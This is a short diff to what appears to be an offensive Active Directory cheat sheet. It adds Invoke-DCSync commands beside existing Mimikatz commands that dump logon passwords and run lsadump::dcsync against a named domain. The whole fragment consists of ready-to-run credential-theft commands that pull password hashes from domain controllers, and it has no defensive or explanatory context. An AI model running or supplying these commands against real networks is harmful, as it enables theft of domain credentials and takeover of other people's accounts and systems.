@@ -10,4 +10,6 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 ```
 mimikatz lsadump::dcsync /domain:insomnia.io /all /csv
 mimikatz lsadump::dcsync /domain:insomnia.io /user:John
+Invoke-DCSync
+Invoke-DCSync -PWDumpFormat
 ```
